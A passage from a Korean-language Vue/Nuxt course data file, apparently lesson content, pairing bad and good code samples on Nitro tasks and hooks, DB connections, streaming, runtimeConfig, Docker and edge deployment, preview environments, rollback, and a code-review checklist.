// 다중 인스턴스면 캐시 스토리지가 Redis 처럼 공유되어야 지우기가 전부에 반영된다 (l1)
`,
        },
        {
          id: 'l5', short: `태스크`,
          title: `정기 작업은 Nitro 태스크로 정의하고, 중복 실행은 락으로 막는다`,
          why: `setInterval 을 서버 플러그인에 두면 인스턴스가 3개일 때 3번 돕니다. Nitro 태스크는 이름으로 정의하고 scheduledTasks 로 크론을 걸거나 /_nitro/tasks 로 수동 실행합니다. 그래도 다중 인스턴스 중복은 막아 주지 않으니 스토리지 락을 겁니다.`,
          bad: String.raw`
// server/plugins/cron.ts
setInterval(() => cleanupExpired(), 60_000)     // 인스턴스 수만큼 실행, 종료 시 정리 없음
`,
          good: String.raw`
// nuxt.config.ts
nitro: { experimental: { tasks: true }, scheduledTasks: { '*/10 * * * *': ['cleanup:sessions'], '0 3 * * *': ['report:daily'] } }

// server/tasks/cleanup/sessions.ts
export default defineTask({
  meta: { name: 'cleanup:sessions', description: '만료 세션 삭제' },
  async run() {
    const lock = useStorage('cache')
    const key = 'lock:cleanup:sessions'
    if (await lock.hasItem(key)) return { result: 'skipped' }
    await lock.setItem(key, Date.now(), { ttl: 540 })          // 9분 — 주기보다 짧게
    try { const n = await deleteExpiredSessions(); return { result: n } }
    finally { await lock.removeItem(key) }
  },
})
// 수동: await runTask('cleanup:sessions')  또는 dev 에서 GET /_nitro/tasks/cleanup:sessions
// 서버리스·엣지 프리셋은 크론이 없다 → 플랫폼 스케줄러(Vercel Cron, Cloudflare Cron Trigger) 가 태스크 엔드포인트를 호출
`,
        },
        {
          id: 'l6', short: `훅`,
          title: `서버 플러그인에서 Nitro 훅으로 요청·오류·종료를 가로채고, 종료 시 연결을 정리한다`,
          why: `요청마다 로깅, 오류 공통 처리, SIGTERM 때 DB 연결 닫기는 핸들러 안이 아니라 플러그인의 훅에 둡니다. close 훅을 빼먹으면 롤링 배포 때 진행 중 쿼리가 끊기거나 커넥션이 새어 DB 가 한계에 닿습니다.`,
          bad: String.raw`
// 각 핸들러에서 console.log(event.path) / try-catch 복사. 종료 처리 없음
`,
          good: String.raw`
// server/plugins/lifecycle.ts
export default defineNitroPlugin((nitro) => {
  nitro.hooks.hook('request', (event) => {
    event.context.requestId = getHeader(event, 'x-request-id') ?? crypto.randomUUID()
    event.context.startedAt = performance.now()
  })
  nitro.hooks.hook('afterResponse', (event) => {
    logger.info({ reqId: event.context.requestId, path: event.path, ms: Math.round(performance.now() - event.context.startedAt) })
  })
  nitro.hooks.hook('error', (error, { event }) => {
    if ((error as any).statusCode >= 500) captureException(error, { reqId: event?.context.requestId })   // 27회차
  })
  nitro.hooks.hookOnce('close', async () => {
    await db.$disconnect(); await redis.quit(); logger.info('shutdown complete')
  })
})
`,
        },
        {
          id: 'l7', short: `계층`,
          title: `핸들러는 파싱·인증·응답만. 비즈니스 로직은 server/services 로 내린다`,
          why: `핸들러 안에 트랜잭션·계산·외부 호출이 다 들어가면 태스크나 다른 핸들러에서 재사용할 수 없고 테스트도 HTTP 를 거쳐야 합니다. 서비스 함수는 입력 타입을 받아 결과를 돌려주는 순수한 모듈이고, 핸들러는 그 함수를 20줄 안에서 부릅니다.`,
          bad: String.raw`
// server/api/orders.post.ts 180줄: readBody, 검증, 재고 확인, 가격 계산, 트랜잭션, 결제 호출, 메일, 응답
`,
          good: String.raw`
// server/services/orders.ts — HTTP 를 모른다
export async function placeOrder(input: PlaceOrderInput, actor: { userId: string }) {
  return db.$transaction(async (tx) => {
    await assertStock(tx, input.items)
    const total = calcTotal(input.items, await getPricing(tx))
    const order = await tx.order.create({ data: { ...input, total, userId: actor.userId } })
    await queue.add('order:placed', { orderId: order.id })         // 메일·결제 후속은 큐로
    return order
  })
}
// server/api/orders.post.ts — 얇게
export default defineEventHandler(async (event) => {
  const user = await requireUser(event)
  const input = await readValidatedBody(event, placeOrderSchema.parse)
  const order = await placeOrder(input, { userId: user.id })
  setResponseStatus(event, 201)
  return order
})
// server/utils 는 auto-import 되므로 "유틸" 이름의 함수만, 서비스는 명시 import 로 경계를 보이게
`,
        },
        {
          id: 'l8', short: `연결`,
          title: `DB 클라이언트는 모듈 범위 싱글턴. dev HMR 중복은 globalThis 로, 서버리스는 풀링 엔드포인트로`,
          why: `핸들러 안에서 new PrismaClient() 를 만들면 요청마다 커넥션이 늘어 DB 가 죽습니다. 모듈 범위에 하나 두되, Nuxt dev 는 HMR 때 모듈을 다시 평가하므로 globalThis 에 보관합니다. 서버리스는 인스턴스마다 하나씩 생기므로 풀러(PgBouncer, Neon pooler, Prisma Accelerate) 를 앞에 둡니다.`,
          bad: String.raw`
export default defineEventHandler(async () => {
  const prisma = new PrismaClient()                 // 요청마다 새 연결
  return prisma.user.findMany()
})
`,
          good: String.raw`
// server/utils/db.ts
import { PrismaClient } from '@prisma/client'
const g = globalThis as unknown as { __prisma?: PrismaClient }
export const db = g.__prisma ?? new PrismaClient({ log: import.meta.dev ? ['warn', 'error'] : ['error'] })
if (import.meta.dev) g.__prisma = db                   // HMR 로 모듈이 다시 평가돼도 하나

// 서버리스: DATABASE_URL 을 풀러 주소로 (pgbouncer=true 또는 Neon 의 -pooler 호스트), connection_limit 작게
// 엣지(Cloudflare/Vercel Edge): TCP 불가 → HTTP 드라이버 (@neondatabase/serverless, PlanetScale serverless, Turso)
`,
        },
        {
          id: 'l9', short: `스트림`,
          title: `큰 응답과 파일은 메모리에 올리지 않고 스트림으로 흘려보낸다`,
          why: `100MB 파일을 Buffer 로 읽어 return 하면 요청 몇 개에 메모리가 터집니다. 스토리지·S3·외부 API 응답은 ReadableStream 그대로 넘기고, 프록시는 sendProxy 로 헤더까지 넘깁니다. 긴 생성 작업은 SSE 로 진행률을 흘립니다(24회차).`,
          bad: String.raw`
export default defineEventHandler(async (e) => {
  const buf = await readFile('/data/export.csv')        // 전부 메모리
  return buf
})
`,
          good: String.raw`
// 파일 → 스트림
import { createReadStream } from 'node:fs'
export default defineEventHandler((e) => {
  setHeader(e, 'content-type', 'text/csv'); setHeader(e, 'content-disposition', 'attachment; filename="export.csv"')
  return sendStream(e, createReadStream('/data/export.csv'))
})
// S3 / 외부 URL 은 프록시
export default defineEventHandler((e) => sendProxy(e, signedUrl, { headers: { 'cache-control': 'private, max-age=60' } }))
// DB 커서 → CSV 스트림
export default defineEventHandler((e) => {
  const stream = new ReadableStream({
    async start(ctrl) {
      ctrl.enqueue('id,total\n')
      for await (const row of iterateOrders()) ctrl.enqueue(row.id + ',' + row.total + '\n')
      ctrl.close()
    },
  })
  setHeader(e, 'content-type', 'text/csv'); return stream
})
`,
        },
        {
          id: 'l10', short: `프리셋`,
          title: `runtimeConfig 로 비밀을 넣고, 프리셋(Node, 서버리스, 엣지) 의 제약을 코드가 가정하지 않게 한다`,
          why: `process.env 를 핸들러에서 직접 읽으면 엣지에서 비어 있고, 빌드 시점에 굳어 버릴 수도 있습니다. runtimeConfig 는 NUXT_ 환경변수로 런타임에 덮이고 서버 전용 키는 클라이언트에 안 나갑니다. 또 fs·child_process·장기 setTimeout 은 엣지에 없으니 그 가정은 l1·l5·l9 의 추상화 뒤에 둡니다.`,
          bad: String.raw`
const key = process.env.STRIPE_SECRET            // 엣지: undefined, 빌드 때 inline 될 수도
export default defineEventHandler(() => fetch('https://api.stripe.com', { headers: { Authorization: 'Bearer ' + key } }))
`,
          good: String.raw`
// nuxt.config.ts
runtimeConfig: {
  stripeSecret: '',                    // NUXT_STRIPE_SECRET 로 주입. 서버 전용
  public: { apiBase: '/api' },         // NUXT_PUBLIC_API_BASE. 클라이언트 노출
}
// 핸들러
export default defineEventHandler((event) => {
  const { stripeSecret } = useRuntimeConfig(event)
  ...
})
// 프리셋별 점검표
// - node-server: 전부 가능. 프로세스 종료 훅(l6) 필수
// - vercel / netlify / aws-lambda: 인스턴스 수명 짧음 → 메모리 캐시 금지(l1 스토리지), 크론은 플랫폼(l5), DB 는 풀러(l8)
// - cloudflare / vercel-edge: Node API 없음 → fs·net 금지, 번들 크기 제한, HTTP DB 드라이버(l8), 1MB 응답 제한 확인
// nitro.preset 은 CI 환경변수(NITRO_PRESET) 로 바꾸고, 로컬에서 같은 프리셋으로 한 번 빌드해 본다
`,
        },
      ],
    },
    {
      id: 'vue-38', no: 38, name: `배포 전략 (Docker, 엣지, 프리뷰 환경)`,
      lead: `어디에 어떻게 올릴지를 코드와 같은 저장소에서 결정하는 습관입니다. 렌더 방식으로 대상을 고르고, 이미지는 한 번 만들어 모든 환경에 쓰고, PR 마다 프리뷰를 띄우고, 되돌리기를 먼저 준비합니다.`,
      lessons: [
        {
          id: 'l1', short: `대상`,
          title: `SSR 이 필요한지부터 묻는다. 정적이면 CDN, SSR 이면 Node 컨테이너, 전 세계 지연이 문제면 엣지`,
          why: `블로그·랜딩·문서는 generate 로 정적 파일이 되어 CDN 에 올리면 서버가 없습니다. 로그인 뒤 개인화 화면이 많으면 SSR 서버가 필요합니다. 엣지는 빠르지만 제약(37회차 l10) 이 있으니 "필요한 지연 요구" 가 있을 때만 고릅니다.`,
          bad: String.raw`
# 문서 사이트를 k8s 에 SSR 로 배포. 서버 비용 + 운영 + 새벽 알림
`,
          good: String.raw`
# 결정표
# 로그인 없음, 콘텐츠 위주         → nuxt generate → S3/CloudFront, Cloudflare Pages, GitHub Pages
# 일부 동적 (댓글, 검색)             → generate + 클라이언트 fetch, 또는 hybrid (routeRules prerender + 일부 SSR)
# 개인화 SSR, 내부망 DB              → Docker (node-server 프리셋) → ECS/k8s/Fly/Railway
# 전 세계 사용자, SSR 가볍고 DB 가 HTTP → 엣지 프리셋 (cloudflare-pages, vercel-edge)
# 팀이 작고 운영 인력 없음           → Vercel/Netlify 같은 관리형. 프리셋 자동
# nuxt.config: nitro.preset 은 환경변수로 (NITRO_PRESET=node-server), 코드는 프리셋을 모른다
`,
        },
        {
          id: 'l2', short: `Dockerfile`,
          title: `멀티 스테이지로 빌드하고, 런타임 이미지에는 .output 만 넣고, root 로 실행하지 않는다`,
          why: `소스·node_modules·devDependencies 가 든 1GB 이미지는 느리고 공격면도 넓습니다. Nuxt 빌드 결과 .output 은 의존성까지 번들된 독립 폴더라 그것만 복사하면 100MB 대가 됩니다. 비루트 사용자와 HEALTHCHECK 는 기본입니다.`,
          bad: String.raw`
FROM node:22
COPY . .
RUN npm install && npm run build
CMD ["npm", "run", "start"]            # root, 1GB, dev 의존성 포함, npm 이 시그널을 가로챔
`,
          good: String.raw`
# syntax=docker/dockerfile:1
FROM node:22-alpine AS build
WORKDIR /app
RUN corepack enable
COPY pnpm-lock.yaml package.json ./
RUN --mount=type=cache,target=/root/.local/share/pnpm/store pnpm fetch
COPY . .
RUN pnpm install --offline --frozen-lockfile && pnpm build       # → .output

FROM node:22-alpine AS runtime
WORKDIR /app
ENV NODE_ENV=production NITRO_PORT=3000 NITRO_HOST=0.0.0.0
COPY --from=build --chown=node:node /app/.output ./.output
USER node
EXPOSE 3000
HEALTHCHECK --interval=15s --timeout=3s --start-period=10s CMD wget -qO- http://127.0.0.1:3000/api/health || exit 1
CMD ["node", ".output/server/index.mjs"]        # npm 거치지 않고 직접 → SIGTERM 이 바로 전달
`,
        },
        {
          id: 'l3', short: `환경 변수`,
          title: `이미지는 하나, 환경은 런타임 변수로. 빌드 시점에 굳는 값을 알고 구분한다`,
          why: `스테이징·운영마다 이미지를 따로 빌드하면 "운영에만 있는 버그" 가 생깁니다. Nuxt 의 runtimeConfig 는 NUXT_ 변수로 런타임에 덮이므로 같은 이미지를 어디든 띄웁니다. 단, import.meta.env.VITE_* 와 app.baseURL 은 빌드 때 굳으니 환경별로 달라선 안 됩니다.`,
          bad: String.raw`
# Dockerfile: ARG API_BASE  RUN API_BASE=$API_BASE pnpm build    → 환경마다 이미지, 운영 이미지는 테스트 안 됨
`,
          good: String.raw`
# 한 이미지. 배포 시 변수만
docker run -e NUXT_PUBLIC_API_BASE=https://api.example.com -e NUXT_STRIPE_SECRET=sk_live_... app:1.4.2

# 런타임에 바뀌어도 되는 것: runtimeConfig (서버·public 모두)
# 빌드 때 굳는 것: app.baseURL, nitro.preset, routeRules, VITE_* → 모든 환경에서 같게 두거나, 다르면 "환경이 아니라 다른 앱" 으로 본다
# 검증: 스테이징 이미지의 digest 와 운영 이미지의 digest 가 같은지 배포 파이프라인이 확인
`,
        },
        {
          id: 'l4', short: `헬스체크`,
          title: `/api/health 는 살아있음과 준비됨을 나누고, SIGTERM 에 진행 중 요청을 마친 뒤 끝낸다`,
          why: `오케스트레이터는 두 질문을 합니다. "프로세스가 살아 있나" 와 "트래픽을 받아도 되나". DB 연결 전에 ready 를 true 로 주면 500 이 쏟아지고, 종료 신호에 즉시 죽으면 진행 중 요청이 끊깁니다. Nitro 는 close 훅을 주므로 거기서 정리합니다(37회차 l6).`,
          bad: String.raw`
export default defineEventHandler(() => 'ok')     // DB 가 죽어도 ok, 종료 처리 없음
`,
          good: String.raw`
// server/api/health.get.ts — liveness: 프로세스만
export default defineEventHandler(() => ({ status: 'ok', version: useRuntimeConfig().public.version }))
// server/api/ready.get.ts — readiness: 의존성까지
export default defineEventHandler(async (e) => {
  try { await db.$queryRaw\`SELECT 1\`; await redis.ping() }
  catch (err) { setResponseStatus(e, 503); return { status: 'not-ready', reason: String(err) } }
  return { status: 'ready' }
})
// k8s: livenessProbe → /api/health, readinessProbe → /api/ready, terminationGracePeriodSeconds: 30
// 종료: Nitro node-server 는 SIGTERM 에 새 연결을 멈추고 진행 중 요청을 기다린다 (NITRO_SHUTDOWN_TIMEOUT). close 훅에서 DB·큐 정리
`,
        },
        {
          id: 'l5', short: `프리뷰`,
          title: `PR 마다 프리뷰 환경을 띄우고, 시드 데이터와 만료를 자동화한다`,
          why: `"로컬에서는 됩니다" 를 없애는 가장 싼 방법입니다. 리뷰어·디자이너·기획이 링크를 클릭해 보고, E2E 도 그 URL 에 돌립니다. 관리형 플랫폼은 기본이고, 자체 인프라면 PR 번호를 네임스페이스로 씁니다. 안 지우면 비용이 쌓이니 머지·종료 시 삭제합니다.`,
          bad: String.raw`
# 스테이징 하나를 모두가 공유. "지금 누가 배포했어요?"
`,
          good: String.raw`
# .github/workflows/preview.yml (자체 인프라 예)
on: { pull_request: { types: [opened, synchronize, reopened, closed] } }
jobs:
  deploy:
    if: github.event.action != 'closed'
    steps:
      - run: docker build -t registry/app:pr-\${{ github.event.number }} .
      - run: helm upgrade --install pr-\${{ github.event.number }} ./chart --namespace previews
             --set image.tag=pr-\${{ github.event.number }} --set host=pr-\${{ github.event.number }}.preview.example.com
             --set seed=true                              # 시드 데이터 (실데이터 복사 금지)
      - uses: marocchino/sticky-pull-request-comment@v2   # PR 에 URL 코멘트
        with: { message: "Preview: https://pr-\${{ github.event.number }}.preview.example.com" }
  cleanup:
    if: github.event.action == 'closed'
    steps: [ { run: helm uninstall pr-\${{ github.event.number }} -n previews } ]
# 프리뷰는 robots: noindex + basic auth 또는 SSO 뒤에. 외부 결제·메일은 샌드박스 키
`,
        },
        {
          id: 'l6', short: `엣지`,
          title: `엣지는 "가벼운 SSR + HTTP 로 닿는 데이터" 일 때만. 무거운 것은 리전 서버에 남긴다`,
          why: `엣지 함수는 사용자 가까이서 돌지만 DB 가 한 리전에 있으면 왕복이 더 길어질 수 있습니다. 번들 크기 제한과 Node API 부재도 있습니다. 캐시 가능한 페이지, 지역화, 인증 검사 같은 얇은 일을 엣지에 두고, 트랜잭션·대용량은 리전 API 로 분리합니다.`,
          bad: String.raw`
# 전체 앱을 엣지로: Prisma(TCP) 불가, sharp 불가, 번들 5MB 초과, DB 는 서울인데 함수는 상파울루
`,
          good: String.raw`
# 분리 배포
# apps/web   → cloudflare-pages 프리셋 (SSR 얇음, KV/캐시, HTTP DB 드라이버)
# apps/api   → node-server 컨테이너, DB 와 같은 리전 (무거운 처리, 트랜잭션, 이미지 처리)
# web 의 routeRules: '/api/heavy/**': { proxy: 'https://api.internal.example.com/**' }

# 엣지에서 할 만한 것: 지역별 리다이렉트, A/B 쿠키, 인증 토큰 검증(JWT 서명), 캐시된 페이지 조립, 봇 차단
# 엣지에서 하지 말 것: 다단계 DB 트랜잭션, 큰 파일 처리, 10초 넘는 작업, Node 전용 라이브러리
# 측정: 같은 페이지를 리전 서버와 엣지에 두고 실제 사용자 지역에서 TTFB 비교 (23회차 RUM)
`,
        },
        {
          id: 'l7', short: `무중단`,
          title: `롤링 배포 중 옛 청크 요청이 404 되지 않게 이전 빌드 자산을 남기고, 청크 오류는 새로고침으로 복구한다`,
          why: `사용자가 페이지를 열어 둔 채 새 버전이 배포되면 이전 해시의 JS 청크를 요청하는데, 새 컨테이너에는 없어 404 가 납니다. 자산을 CDN 에 올려 두 버전을 함께 두거나, 최소한 청크 로드 실패 시 한 번 새로고침하게 합니다. Nuxt 는 그 훅을 줍니다.`,
          bad: String.raw`
# 배포 → 컨테이너 교체 → 열려 있던 탭에서 라우트 이동 → "Failed to fetch dynamically imported module"
`,
          good: String.raw`
// nuxt.config.ts
experimental: { emitRouteChunkError: 'automatic' },   // 청크 로드 실패 시 자동 새로고침 (기본값 확인)
app: { cdnURL: 'https://cdn.example.com/app/' },      // 자산은 CDN 에 — 배포 때 이전 빌드 폴더를 지우지 않는다 (N 버전 보관)

// 세밀하게 제어하려면
export default defineNuxtPlugin((nuxtApp) => {
  nuxtApp.hook('app:chunkError', ({ error }) => {
    if (sessionStorage.getItem('chunk-reloaded')) return      // 무한 루프 방지
    sessionStorage.setItem('chunk-reloaded', '1'); reloadNuxtApp({ persistState: true })
  })
  nuxtApp.hook('app:mounted', () => sessionStorage.removeItem('chunk-reloaded'))
})
// 서버 측: 롤링 업데이트 maxUnavailable: 0, readiness 통과 후 트래픽, 세션은 외부(Redis) 에 (37회차 l1)
`,
        },
        {
          id: 'l8', short: `재현성`,
          title: `Node 버전·락파일·빌드 환경을 고정해 어디서 빌드해도 같은 결과가 나오게 한다`,
          why: `"CI 에서는 되는데 내 컴퓨터에선 안 돼요" 의 절반은 Node 버전, 나머지는 락파일 무시입니다. engines + .nvmrc + packageManager 필드로 버전을 적고, CI 는 --frozen-lockfile 로만 설치하며, 빌드는 Dockerfile 안에서만 합니다.`,
          bad: String.raw`
# 개발자 A: Node 18, B: Node 22, CI: latest. pnpm install 이 락파일을 조용히 갱신
`,
          good: String.raw`
// package.json
{ "engines": { "node": ">=22.11 <23" }, "packageManager": "pnpm@10.4.1" }
# .npmrc
engine-strict=true
# .nvmrc / .node-version
22.11.0

# CI
- uses: actions/setup-node@v4  with: { node-version-file: '.nvmrc', cache: 'pnpm' }
- run: corepack enable && pnpm install --frozen-lockfile
# Docker: FROM node:22.11-alpine (메이저만 적지 않는다). 빌드는 CI 와 Dockerfile 이 같은 명령 (pnpm build) 을 쓰고, 산출물은 이미지 하나 (l3)
# 재현 검사: 같은 커밋을 두 번 빌드해 .output 의 해시 비교 (타임스탬프·랜덤 해시가 들어가면 그 지점을 제거)
`,
        },
        {
          id: 'l9', short: `되돌리기`,
          title: `이미지 태그는 커밋 SHA, 롤백은 이전 태그 재배포. DB 변경은 앞뒤 버전이 공존하게 만든다`,
          why: `롤백이 "이전 커밋을 다시 빌드" 면 10분이 걸리고 그 사이 빌드가 실패할 수도 있습니다. 이미 있는 이미지 태그로 되돌리면 30초입니다. 단 새 버전이 컬럼을 지웠으면 옛 코드가 못 돕니다. 스키마 변경은 확장(추가) → 코드 전환 → 수축(삭제) 세 배포로 나눕니다.`,
          bad: String.raw`
# 태그 latest 하나. 롤백 = git revert → CI 10분
# 마이그레이션: ALTER TABLE users DROP COLUMN name 을 코드 변경과 같은 배포에
`,
          good: String.raw`
# 태그: app:\${GIT_SHA} + app:v1.4.2. latest 는 쓰지 않는다
# 롤백: helm rollback / kubectl set image ... app:\${PREV_SHA} — 빌드 없음
# 배포 기록: 어떤 SHA 가 언제 어디에 → Sentry release (27회차), 배포 채널 메시지

# DB 는 expand/contract
# 배포 1 (expand):   ADD COLUMN full_name; 코드는 name 과 full_name 둘 다 쓴다 (읽기 name, 쓰기 둘 다)
# 배포 2 (migrate):  백필 스크립트; 코드는 full_name 만 읽는다
# 배포 3 (contract): DROP COLUMN name  — 배포 1·2 가 안정된 뒤
# 각 단계에서 롤백해도 직전 버전 코드가 동작한다
`,
        },
        {
          id: 'l10', short: `배포 후`,
          title: `배포 직후 스모크 테스트를 돌리고, 오류율이 튀면 자동으로 되돌린다`,
          why: `배포가 "끝났다" 는 컨테이너가 떴다는 뜻이지 서비스가 된다는 뜻이 아닙니다. 핵심 흐름 3개를 운영 URL 에 바로 돌리고, 5분간 5xx 비율·LCP 를 직전 버전과 비교해 임계를 넘으면 사람 없이 롤백합니다. 카나리(5% 트래픽) 면 피해도 5% 입니다.`,
          bad: String.raw`
# 배포 완료 메시지 → 다음 날 아침 고객 문의로 알게 됨
`,
          good: String.raw`
# 파이프라인 마지막 단계
- name: smoke
  run: pnpm playwright test e2e/smoke --project=prod  # 홈, 로그인, 결제 진입 3개, 2분 이내 (21회차 CI 설계)
  env: { BASE_URL: https://www.example.com }
- name: watch
  run: node scripts/watch-deploy.ts --minutes 5 --max-5xx 0.5 --release \${{ github.sha }}
# watch-deploy: 모니터링 API(27회차) 에서 release 별 5xx 비율·p95 를 읽어 직전 release 와 비교, 초과면 helm rollback 호출 + 알림

# 카나리 (Argo Rollouts / 플랫폼 기능)
strategy: { canary: { steps: [{ setWeight: 5 }, { pause: { duration: 5m } }, { analysis: { templates: [error-rate] } }, { setWeight: 50 }, { pause: { duration: 5m } }] } }
# 배포 마커: Sentry·Grafana 에 release 주석 → 그래프에서 "이 배포 뒤부터" 가 보인다
`,
        },
      ],
    },
    {
      id: 'vue-39', no: 39, name: `코드 리뷰 체크리스트`,
      lead: `리뷰는 코드가 아니라 결정을 확인하는 자리입니다. 저자가 먼저 할 일, 리뷰어가 보는 순서, Vue·Nuxt 에서 특히 자주 놓치는 것, 코멘트를 쓰는 말투까지 한 묶음입니다. 스타일은 도구에 맡기고 사람은 판단만 봅니다.`,
      lessons: [
        {
          id: 'l1', short: `저자 먼저`,
          title: `올리기 전에 자기 diff 를 리뷰어처럼 한 번 읽고, 설명에 왜·무엇·어떻게 확인했는지를 적는다`,
          why: `리뷰어가 처음 보는 건 코드가 아니라 설명입니다. "버그 수정" 한 줄이면 리뷰어가 맥락을 다시 캐야 하고, 그 시간이 리뷰 지연의 대부분입니다. 자기 diff 를 다시 읽으면 디버그 로그, 주석 처리 코드, 무관한 포맷 변경의 절반은 올리기 전에 빠집니다.`,
          bad: String.raw`
제목: fix
본문: (없음)
diff: 기능 변경 + 프리티어 재포맷 300줄 + console.log 3개 + "// TODO 나중에"
`,
          good: String.raw`
제목: 주문 목록: 필터 변경 시 이전 페이지 번호가 남는 문제 수정
왜:   필터를 바꾸면 page=7 이 그대로라 빈 목록이 보였다 (이슈 #412)
무엇: 필터 watch 에서 page 를 1 로 되돌림. URL 쿼리도 함께 갱신 (26회차 l4 패턴)
확인: 단위 테스트 추가 (useOrderQuery.test.ts), 프리뷰에서 필터 → 페이지 → 필터 순으로 수동 확인
범위 밖: 정렬 변경 시에도 같은 문제가 있어 보이나 별도 PR (#418)

# 올리기 전 체크: 무관한 포맷 변경 분리, 로그 제거, 300줄 넘으면 쪼갠다 (리뷰 품질은 400줄부터 급락)
`,
        },
        {
          id: 'l2', short: `첫 질문`,
          title: `리뷰어의 첫 질문은 "요구를 맞게 풀었나" 와 "더 작은 방법은 없나" 다. 스타일은 린터에 맡긴다`,
          why: `들여쓰기·따옴표·import 순서를 사람이 지적하면 리뷰가 소음으로 차고 정작 설계 문제는 묻힙니다. 그건 ESLint·Prettier 가 CI 에서 막게 두고, 사람은 "이 변경이 문제를 푸는가", "이 추상화가 지금 필요한가", "삭제할 수 있는 코드가 늘었나" 를 봅니다.`,
          bad: String.raw`
// 코멘트 12개: "세미콜론", "여기 공백", "import 정렬", "const 로", ... 설계 코멘트 0개
`,
          good: String.raw`
// 읽는 순서
// 1) 설명과 이슈 → 무엇을 풀려는지 이해. 안 맞으면 코드 전에 질문
// 2) 테스트 diff → 어떤 동작이 보장되는지. 테스트가 구현을 재진술하면 지적
// 3) 공개 인터페이스 (props, emit, API 응답, 스키마) → 바뀌면 호환성·이름
// 4) 구현 → 에러 경로, 경계값, 동시성
// 5) 마지막에 가독성 (이름, 길이)
// 스타일: eslint --max-warnings 0 + prettier --check 가 CI 에서 실패시키므로 코멘트하지 않는다
`,
        },
        {
          id: 'l3', short: `Vue 점검`,
          title: `Vue 에서 꼭 보는 것: 반응성 끊김, key 없는 v-for, props 변경, watch 로 computed 를 흉내낸 곳`,
          why: `이 네 가지는 린터가 일부만 잡고, 런타임엔 조용히 틀립니다. 구조 분해로 반응성이 끊긴 값, 인덱스 key, 부모 props 를 자식이 고치는 코드, watch 안에서 다른 ref 를 계산하는 패턴은 리뷰어가 눈으로 찾아야 합니다(03·04·06·10회차의 요약).`,
          bad: String.raw`
const { count } = toRefs(props)   // OK   vs   const { count } = props   // 끊김
<li v-for="(item, i) in items" :key="i">                               // 인덱스 key
props.modelValue.name = 'x'                                            // props 변경
watch(items, () => { total.value = items.value.reduce(...) })          // computed 로 될 것
`,
          good: String.raw`
// 리뷰 체크리스트 (Vue)
// [ ] props 를 구조 분해했으면 toRefs 또는 3.5 reactive props destructure 인가
// [ ] v-for key 가 고유 id 인가 (인덱스면 재정렬·삭제 시 상태가 밀린다)
// [ ] 자식이 props 를 직접 바꾸지 않는가 → emit('update:x') 또는 defineModel
// [ ] watch 가 "다른 상태를 계산" 하면 computed 로. watch 는 부작용(fetch, 저장) 에만
// [ ] 템플릿에 인라인 객체·화살표 함수가 반복 요소 안에 없는가 (매 렌더 새 참조)
// [ ] onMounted 에서 등록한 리스너·타이머를 onUnmounted 에서 해제하는가 (또는 VueUse 사용)
// [ ] ref 와 shallowRef 선택이 데이터 크기에 맞는가
`,
        },
        {
          id: 'l4', short: `Nuxt 점검`,
          title: `Nuxt 에서 꼭 보는 것: 서버·클라이언트 경계, useFetch 키, 비밀 노출, 하이드레이션 불일치`,
          why: `서버에서만 도는 코드가 window 를 만지거나, 클라이언트에만 있는 값으로 첫 렌더가 달라지거나, 서버 전용 키가 public 에 들어가면 운영에서만 터집니다. useFetch 키 충돌은 다른 페이지의 데이터가 보이는 괴상한 버그로 나타납니다(12·15·28회차).`,
          bad: String.raw`
const w = window.innerWidth                              // setup 최상단: SSR 에서 ReferenceError
useFetch('/api/items', { key: 'items' })                 // 다른 페이지와 같은 키, 다른 쿼리
runtimeConfig: { public: { stripeSecret: '...' } }      // 비밀이 번들에
<p>{{ new Date().toLocaleTimeString() }}</p>            // 서버·클라 시간 다름 → 하이드레이션 경고
`,
          good: String.raw`
// 리뷰 체크리스트 (Nuxt)
// [ ] window·document·localStorage 접근이 onMounted / import.meta.client / <ClientOnly> 안에 있는가
// [ ] useFetch/useAsyncData 의 키가 URL·쿼리를 포함해 고유한가 (키를 생략하면 자동 생성 — 명시했다면 왜?)
// [ ] runtimeConfig.public 에 비밀이 없는가. 서버 전용 모듈(db, 비밀 키) 이 components/ 나 composables/ 에서 import 되지 않는가
// [ ] 첫 렌더 결과가 서버·클라에서 같은가 (시간, 랜덤, 사용자 설정은 쿠키나 useState 로)
// [ ] server/api 핸들러가 입력을 검증(readValidatedBody) 하고 권한을 확인하는가
// [ ] 새 라우트에 routeRules(캐시/ssr) 가 맞게 걸렸는가. 개인화 페이지가 캐시되지 않는가
// [ ] 에러 시 createError 로 상태 코드를 주는가 (500 으로 뭉개지 않았나)
`,
        },
        {
          id: 'l5', short: `실패 경로`,
          title: `모든 변경에 "실패하면 어떻게 되나" 를 묻는다. 빈 catch, 없는 로딩·빈 상태를 찾는다`,
          why: `행복 경로는 저자가 이미 확인했습니다. 리뷰어의 가치는 그 다음에 있습니다. 네트워크가 끊기면, 목록이 비면, 권한이 없으면, 두 번 클릭하면, 응답이 느리면 어떻게 보이는지를 코드에서 찾고 없으면 묻습니다(27회차).`,
          bad: String.raw`
try { await save() } catch {}                      // 삼킴
const { data } = await useFetch('/api/items')      // error, pending 무시
<ul><li v-for="i in data">...</li></ul>            // 빈 목록 → 빈 화면
`,
          good: String.raw`
// 리뷰 질문 템플릿 (복붙해서 코멘트)
// - 이 요청이 실패하면 사용자는 무엇을 보나요? 재시도는 어디서 하나요?
// - 목록이 0건일 때와 로딩 중일 때 화면이 구분되나요?
// - 이 버튼을 연타하면 요청이 두 번 가나요? (isSubmitting)
// - 이 catch 는 무엇을 잡으려는 건가요? 잡은 뒤 로그/알림은 어디로 가나요?
// - 응답이 10초 걸리면 (타임아웃, 취소) 어떻게 되나요?
// 저자가 "그 경우는 없다" 고 하면 테스트로 적어 달라고 한다 (없다는 것도 보장이니까)
`,
        },
        {
          id: 'l6', short: `테스트 보기`,
          title: `테스트가 바뀐 동작을 설명하는지 본다. 구현을 복사한 테스트, 항상 통과하는 테스트를 가려낸다`,
          why: `테스트 파일이 있다고 안전한 게 아닙니다. 모킹이 과해 실제 로직이 안 돌거나, 단언이 없거나, 구현 세부를 그대로 적어 리팩터링만 막는 테스트는 없는 것보다 비쌉니다. 리뷰어는 테스트를 "요구사항 목록" 으로 읽고, 빠진 케이스를 묻습니다(36회차).`,
          bad: String.raw`
it('calls api', async () => {
  vi.mock('~/utils/api', () => ({ fetchOrders: vi.fn().mockResolvedValue([]) }))
  await useOrders().load()
  expect(fetchOrders).toHaveBeenCalled()         // 호출됐다는 것 외에 아무것도 보장 안 함
})
`,
          good: String.raw`
// 리뷰 체크리스트 (테스트)
// [ ] 테스트 이름이 요구사항 문장인가 ("필터 바꾸면 1페이지로")
// [ ] 변경된 분기마다 테스트가 있는가 (커버리지 diff 로 확인)
